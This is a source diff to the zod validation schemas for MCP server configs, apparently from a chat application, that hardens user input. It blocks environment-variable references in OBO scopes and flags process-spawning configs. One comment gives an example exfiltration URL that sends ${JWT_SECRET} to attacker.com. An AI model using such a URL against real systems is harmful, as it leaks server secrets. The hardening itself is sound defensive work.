@@ -157,12 +157,16 @@ const OboOptionsSchema = z.object({
     .pipe(z.string().min(1)),
 });
 
+export const MCP_SERVER_TITLE_PATTERN = new RegExp(
+  "^[\\p{L}\\p{N}][\\p{L}\\p{N}\\p{M}'’ -]*$",
+  'u',
+);
+export const MCP_SERVER_TITLE_ERROR =
+  'Title must start with a letter or number and can include spaces, hyphens, and apostrophes';
+
 const BaseOptionsSchema = z.object({
-  /** Display name for the MCP server - only letters, numbers, and spaces allowed */
-  title: z
-    .string()
-    .regex(/^[a-zA-Z0-9 ]+$/, 'Title can only contain letters, numbers, and spaces')
-    .optional(),
+  /** Display name for the MCP server */
+  title: z.string().regex(MCP_SERVER_TITLE_PATTERN, MCP_SERVER_TITLE_ERROR).optional(),
   /** Description of the MCP server */
   description: z.string().optional(),
   /**
@@ -257,6 +261,33 @@ const ProxyUrlSchema = z
     },
   );
 
+const PROCESS_MCP_SERVER_FIELDS = new Set(['command', 'args', 'env', 'cwd', 'stderr']);
+
+export function isProcessMCPServerField(field: string): boolean {
+  return PROCESS_MCP_SERVER_FIELDS.has(field);
+}
+
+export function isProcessMCPServerConfig(value: unknown): boolean {
+  if (value == null || typeof value !== 'object' || Array.isArray(value)) {
+    return false;
+  }
+
+  const config = value as Record<string, unknown>;
+  if (config.type === 'stdio') {
+    return true;
+  }
+
+  return Object.keys(config).some(isProcessMCPServerField);
+}
+
+export function hasProcessMCPServerConfig(value: unknown): boolean {
+  if (value == null || typeof value !== 'object' || Array.isArray(value)) {
+    return false;
+  }
+
+  return Object.values(value).some(isProcessMCPServerConfig);
+}
+
 export const StdioOptionsSchema = BaseOptionsSchema.extend({
   type: z.literal('stdio').default('stdio'),
   obo: z.undefined().optional(),
@@ -296,6 +327,11 @@ export const StdioOptionsSchema = BaseOptionsSchema.extend({
   stderr: z
     .union([z.enum(['pipe', 'ignore', 'inherit']), z.number().int().nonnegative()])
     .optional(),
+  /**
+   * Working directory for the spawned process. Supplied by Agent Plugins
+   * packages, which resolve and contain the path before it reaches this schema.
+   */
+  cwd: z.string().optional(),
 });
 
 export const WebSocketOptionsSchema = BaseOptionsSchema.extend({
@@ -422,6 +458,20 @@ const userUrlSchema = (protocolCheck: (val: string) => boolean, message: string)
     .refine(protocolCheck, { message });
 
 /**
+ * OBO options for user input: same shape as {@link OboOptionsSchema} but without
+ * its extractEnvVariable transform, so a submitted `${VAR}` is rejected rather
+ * than resolved into the stored config.
+ */
+const UserOboOptionsSchema = z.object({
+  scopes: z
+    .string()
+    .refine((val) => !envVarPattern.test(val), {
+      message: 'Environment variable references are not allowed in OBO scopes',
+    })
+    .pipe(z.string().min(1)),
+});
+
+/**
  * MCP Server configuration that comes from UI/API input only.
  * Omits server-managed fields like startup, timeout, customUserVars, etc.
  * Allows: title, description, url, iconPath, oauth (user credentials).
@@ -437,6 +487,14 @@ const userUrlSchema = (protocolCheck: (val: string) => boolean, message: string)
  * through user-controlled URLs (e.g. http://attacker.com/?k=${JWT_SECRET}).
  * Protocol checks use positive allowlists (http(s) / ws(s)) to block
  * file://, ftp://, javascript:, and other non-network schemes.
+ *
+ * SECURITY: `obo` uses UserOboOptionsSchema for the same reason — the admin
+ * schema's `scopes` carries the extractEnvVariable transform, which would
+ * resolve and persist any non-denylisted secret (e.g. ${OPENID_CLIENT_SECRET}).
+ * The field itself stays user-submittable because whether a caller may set it
+ * is enforced by the CONFIGURE_OBO permission in the MCP controllers, and
+ * `MCP_USER_INPUT_FIELDS` must keep listing it so the OBO lockdown check
+ * continues to treat obo changes as locked.
  */
 export const MCPServerUserInputSchema = z.union([
   userManagedServerFields(WebSocketOptionsSchema).extend({
@@ -445,10 +503,12 @@ export const MCPServerUserInputSchema = z.union([
   userManagedServerFields(SSEOptionsSchema).extend({
     proxy: z.never().optional(),
     url: userUrlSchema(isHttpProtocol, 'SSE URL must use http:// or https://'),
+    obo: UserOboOptionsSchema.optional(),
   }),
   userManagedServerFields(StreamableHTTPOptionsSchema).extend({
     proxy: z.never().optional(),
     url: userUrlSchema(isHttpProtocol, 'Streamable HTTP URL must use http:// or https://'),
+    obo: UserOboOptionsSchema.optional(),
   }),
 ]);
 
